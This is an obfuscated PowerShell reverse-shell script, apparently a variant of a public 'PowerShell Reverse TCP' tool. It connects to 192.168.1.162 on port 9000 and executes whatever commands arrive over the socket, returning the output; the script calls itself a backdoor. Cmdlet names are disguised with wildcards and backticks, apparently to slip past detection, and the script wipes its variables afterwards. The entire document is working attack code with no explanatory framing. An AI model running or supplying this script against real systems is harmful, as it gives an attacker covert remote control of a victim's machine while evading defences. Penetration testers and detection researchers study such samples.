# change the host address and/or port number as necessary
# obfuscated host address, same as $a = "127.0.0.1";
$a = "192.168.1.162";
# obfuscated port number, same as $p = 9000;
$p = 1000 + 1000 + 1000 + 6000;
& (`G`C`M *e-Ho??) "PowerShell Reverse TCP v4.0 by Ivan Sincek.";
& (`G`C`M *e-Ho??) "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
$c = $s = $b = $w = $d = $r = $null;
try {
	$c = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
	$s = $c.GetStream();
	$b = & (`G`C`M *ew-O*) Byte[] (1024 + 12 - 12);
	$e = & (`G`C`M *ew-O*) Text.UTF8Encoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($s, [Text.Encoding]::UTF8, 1024)');
	$w.AutoFlush = $true;
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	& (`G`C`M *e-Ho??) "";
	$by = 0;
	do {
		$w.Write("PS>");
		do {
			$by = $s.Read($b, 0, $b.Length);
			if ($by -gt 0) {
				$d += $e.GetString($b, 0, $by);
			}
		} while ($s.DataAvailable);
		if ($by -gt 0) {
			$d = $d.Trim();
			if ($d.Length -gt 0) {
				try {
					$r = & (`G`C`M *ke-E*) -Command $d 2>&1 | & (`G`C`M *ut-S?????);
				} catch {
					$r = $_.Exception | & (`G`C`M *ut-S?????);
				}
				& (`G`C`M *ar-V*) d;
				if ($r.Length -gt 0) {
					$w.Write($r);
					& (`G`C`M *ar-V*) r;
				}
			}
		}
	} while ($by -gt 0);
	& (`G`C`M *e-Ho??) "Backdoor will now exit...";
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
} finally {
	if ($w -ne $null) {
		$w.Close(); $w.Dispose();
		& (`G`C`M *ar-V*) w;
	}
	if ($s -ne $null) {
		$s.Close(); $s.Dispose();
		& (`G`C`M *ar-V*) s;
	}
	if ($c -ne $null) {
		$c.Close(); $c.Dispose();
		& (`G`C`M *ar-V*) c;
	}
	if ($b -ne $null) {
		$b.Clear();
		& (`G`C`M *ar-V*) b;
	}
	if ($r -ne $null) {
		& (`G`C`M *ar-V*) r;
	}
	if ($d -ne $null) {
		& (`G`C`M *ar-V*) d;
	}
	[GC]::('COL' + 'LECT')();
}
& (`G`C`M *ar-V*) a;
& (`G`C`M *ar-V*) p;
